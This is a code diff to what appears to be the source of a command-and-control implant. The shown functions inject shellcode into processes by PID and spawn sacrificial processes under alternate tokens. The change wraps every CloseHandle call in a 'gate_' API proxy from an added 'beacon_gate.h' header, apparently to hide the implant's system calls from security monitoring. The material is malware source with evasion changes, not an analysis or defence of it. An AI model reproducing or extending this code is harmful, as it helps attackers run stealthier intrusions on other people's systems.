@@ -5,6 +5,7 @@
 #include "syscalls.h"
 #include <stdio.h>
 #include <windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include "spawn_trace.h"
 #include "beacon.h"
 #include "commands.h"
@@ -45,12 +46,12 @@ void command_inject_pid(char * buffer, int length, BOOL x86) {
 	/* check if the process is x86 or not */
 	if (x86 && is_x64_process(hProcess)) {
 		post_error_d(0x12, pid);
-		CloseHandle(hProcess);
+		gate_CloseHandle(hProcess);
 		return;
 	}
 	else if (!x86 && !is_x64_process(hProcess)) {
 		post_error_d(0x13, pid);
-		CloseHandle(hProcess);
+		gate_CloseHandle(hProcess);
 		return;
 	}
 
@@ -58,7 +59,7 @@ void command_inject_pid(char * buffer, int length, BOOL x86) {
 	inject_process_logic(NULL, hProcess, pid, data_buffer(&parser), data_length(&parser), offset, NULL, 0);
 
 	/* we're done... */
-	CloseHandle(hProcess);
+	gate_CloseHandle(hProcess);
 }
 
 /* inject some shellcode... enclosed stuff is the shellcode y0 */
@@ -281,8 +282,8 @@ void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellc
 
 	/* do our spawn logic, please! */
 	if (!spawn_patsy(x86, ignoreToken, &si, &pi)) {
-		CloseHandle(read_stdout);
-		CloseHandle(newstdout);
+		gate_CloseHandle(read_stdout);
+		gate_CloseHandle(newstdout);
 		token_guard_stop_maybe(ignoreToken);
 		return;
 	}
@@ -430,12 +431,12 @@ void command_job_spawn_user(char * buffer, int length, BOOL x86) {
 
 		if (x86 && is_x64_process(hProcess)) {
 			post_error_d(0x12, pid);
-			CloseHandle(hProcess);
+			gate_CloseHandle(hProcess);
 			return;
 		}
 		else if (!x86 && !is_x64_process(hProcess)) {
 			post_error_d(0x13, pid);
-			CloseHandle(hProcess);
+			gate_CloseHandle(hProcess);
 			return;
 		}
 
@@ -494,7 +495,7 @@ void command_job_spawn_user(char * buffer, int length, BOOL x86) {
 			}
 		}
 
-		CloseHandle(hProcess);
+		gate_CloseHandle(hProcess);
 		return;
 	}
 
